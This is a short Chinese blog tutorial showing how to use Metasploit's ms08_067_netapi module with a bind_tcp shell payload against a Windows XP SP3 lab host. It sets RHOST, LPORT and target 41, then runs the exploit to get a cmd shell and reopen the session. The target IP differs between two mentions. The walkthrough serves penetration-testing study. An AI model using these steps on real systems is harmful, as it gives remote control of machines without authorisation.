title: metasploit 利用 ms08_067
date: 2014-10-29 22:11
tags:
- kail
- metasploit
categories:
- metasploit
---

# I、实验环境
- 目标主机  XP SP3 简体中文版
- IP  192.168.49.128

# II、测试过程
## ① 选择exploit模块
```
use exploit/windows/smb/ms08_067_netapi
```
如果不知道ms08_067的具体位置  可以使用search ms08_067
##  ② 选择payload
```
set PAYLOAD windows/shell/bind_tcp
```
查看需要设置的参数
```
show options
```
![](http://img.blog.csdn.net/20141029215838917)

## ③ 设置目标主机
```
set RHOST 192.168.40.128
```
设置目标主机端口
```
set LPORT 5555
```
设置目标的版本号  使用 show targets 查看版本号

![](http://img.blog.csdn.net/20141029215844128)

可以看到 sp3 简体中文版的id 是 41
```
set TARGET 41
```
![](http://img.blog.csdn.net/20141029215848605)
## ④ 查看所有选项是否设置好  show options
![](http://img.blog.csdn.net/20141029215852895)

# III、进行渗透测试   exploit
      
等待一段时间后，获取目标主机的cmd权限
![](http://img.blog.csdn.net/20141029215947640)

# IV、将对目标主机的控制权保存到sessions中

- 命令：  sessions -i 1 重新获取对目标主机的控制权
- 说明：我的BT5是英文版的，不支持中文
![](http://img.blog.csdn.net/20141029215904392)





